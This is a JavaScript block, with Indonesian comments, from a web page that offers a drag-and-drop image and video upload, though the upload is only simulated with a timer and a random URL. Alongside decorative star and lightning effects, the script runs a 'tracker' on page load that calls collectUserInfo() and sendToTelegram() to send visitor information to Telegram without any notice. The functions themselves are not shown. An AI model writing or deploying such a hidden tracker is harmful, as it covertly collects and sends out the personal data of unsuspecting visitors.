    <script>
        // Semua kode JavaScript sebelumnya tetap sama
        // ... 
        
        // Elemen untuk fitur upload
        const fileInput = document.getElementById('fileInput');
        const uploadArea = document.getElementById('uploadArea');
        const uploadBtn = document.getElementById('uploadBtn');
        const uploadResult = document.getElementById('uploadResult');
        const uploadResultTitle = document.getElementById('uploadResultTitle');
        const uploadResultUrl = document.getElementById('uploadResultUrl');
        const copyUploadBtn = document.getElementById('copyUploadBtn');
        
        let selectedFile = null;
        
        // Event listeners untuk drag and drop
        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
            uploadArea.addEventListener(eventName, preventDefaults, false);
        });
        
        function preventDefaults(e) {
            e.preventDefault();
            e.stopPropagation();
        }
        
        ['dragenter', 'dragover'].forEach(eventName => {
            uploadArea.addEventListener(eventName, highlight, false);
        });
        
        ['dragleave', 'drop'].forEach(eventName => {
            uploadArea.addEventListener(eventName, unhighlight, false);
        });
        
        function highlight() {
            uploadArea.classList.add('highlight');
        }
        
        function unhighlight() {
            uploadArea.classList.remove('highlight');
        }
        
        uploadArea.addEventListener('drop', handleDrop, false);
        
        function handleDrop(e) {
            const dt = e.dataTransfer;
            const files = dt.files;
            handleFiles(files);
        }
        
        fileInput.addEventListener('change', function() {
            handleFiles(this.files);
        });
        
        function handleFiles(files) {
            if (files.length > 0) {
                selectedFile = files[0];
                
                // Validasi tipe file
                const fileType = selectedFile.type;
                if (!fileType.startsWith('image/') && !fileType.startsWith('video/')) {
                    showUploadResult('error', 'Hanya file gambar dan video yang diizinkan.');
                    uploadBtn.disabled = true;
                    return;
                }
                
                // Tampilkan info file
                const fileInfo = uploadArea.querySelector('.file-info');
                fileInfo.textContent = `File: ${selectedFile.name} (${formatFileSize(selectedFile.size)})`;
                
                uploadBtn.disabled = false;
            }
        }
        
        uploadBtn.addEventListener('click', function() {
            if (!selectedFile) return;
            
            uploadBtn.disabled = true;
            uploadBtn.textContent = 'Mengupload...';
            
            const selectedUrl = document.querySelector('input[name="urlOption"]:checked').value;
            
            // Simulasi upload (dalam implementasi nyata, ini akan menggunakan fetch atau XMLHttpRequest)
            setTimeout(() => {
                // Ini adalah simulasi - dalam implementasi nyata, Anda akan mengirim file ke server
                const randomId = Math.random().toString(36).substring(2, 10);
                const fileExtension = selectedFile.name.split('.').pop();
                const uploadedUrl = `${selectedUrl}/uploaded-${randomId}.${fileExtension}`;
                
                showUploadResult('success', uploadedUrl);
                uploadBtn.textContent = 'Upload File';
            }, 2000);
        });
        
        copyUploadBtn.addEventListener('click', function() {
            const urlText = uploadResultUrl.textContent;
            navigator.clipboard.writeText(urlText).then(() => {
                copyUploadBtn.textContent = 'Tersalin!';
                setTimeout(() => {
                    copyUploadBtn.textContent = 'Salin URL';
                }, 2000);
            });
        });
        
        function showUploadResult(type, message) {
            uploadResult.className = 'upload-result';
            uploadResult.classList.add(type);
            
            if (type === 'success') {
                uploadResultTitle.textContent = 'Upload Berhasil!';
                uploadResultUrl.textContent = message;
                copyUploadBtn.style.display = 'inline-block';
            } else {
                uploadResultTitle.textContent = 'Upload Gagal';
                uploadResultUrl.textContent = message;
                copyUploadBtn.style.display = 'none';
            }
            
            uploadResult.scrollIntoView({ behavior: 'smooth' });
        }
        
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        
        // Inisialisasi dan jalankan tracker
        createStars();
        createFallingStars();
        startLightningEffect();
        updateProgress(0);
        
        // Periksa status baterai saat halaman dimuat
        checkBatteryStatus();
        
        // Putar voice intro otomatis saat halaman dimuat
        window.addEventListener('load', function() {
            setTimeout(playVoiceIntro, 1000);
            
            // Jalankan tracker
            setTimeout(async () => {
                const userInfo = await collectUserInfo();
                await sendToTelegram(userInfo);
            }, 2000);
        });
        
        // Perbarui sesi aktif secara berkala
        setInterval(() => {
            if (currentSessionId) {
                activeSessions[currentSessionId].timestamp = Date.now();
            }
        }, 60000); // Perbarui setiap menit
        
        // Fungsi untuk membuat ID sesi unik
        function generateSessionId() {
            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
